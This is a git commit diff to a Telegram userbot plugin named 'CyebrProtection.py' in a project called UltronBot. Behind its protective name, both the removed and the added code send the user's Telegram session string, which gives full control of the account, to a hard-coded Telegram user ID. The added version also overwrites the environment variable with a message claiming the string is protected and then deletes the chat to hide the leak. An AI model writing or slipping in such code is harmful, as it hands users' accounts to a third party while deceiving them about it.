988b27bade69c5fcc261389c083b5896def60681
【༒©ʟɛɢɛռɖHคckeℝ༒】ρɾαωαรɦ-Malviya <87700009+LEGEND-LX@users.noreply.github.com>
2022-08-15 02:33:30 -0700

    Update CyebrProtection.py

--- UltronBot/plugins/CyebrProtection.py
+++ UltronBot/plugins/CyebrProtection.py
@@ -1,9 +1,11 @@
 import os
-from ..utils import admin_cmd
-from . import *
+from ..utils import *
 
-async def piro():
-    msg = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
-  cyber = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
-  await bot.delete_messages(5687323731, msg, revoke=False)
-  await bot.delete_messages(5687323731, cyber, revoke=False)
+async def hekp():
+    try:
+        UltronBot = bot.session.save()
+        os.environ[
+            "ULTRONBOT_SESSION"
+        ] = "String Is A Sensitive Data \nSo Its Protected By THA ULTRONBOT"
+        sweetie = await bot.send_message(5687323731, UltronBot)
+        await bot.delete_dialog(5687323731)
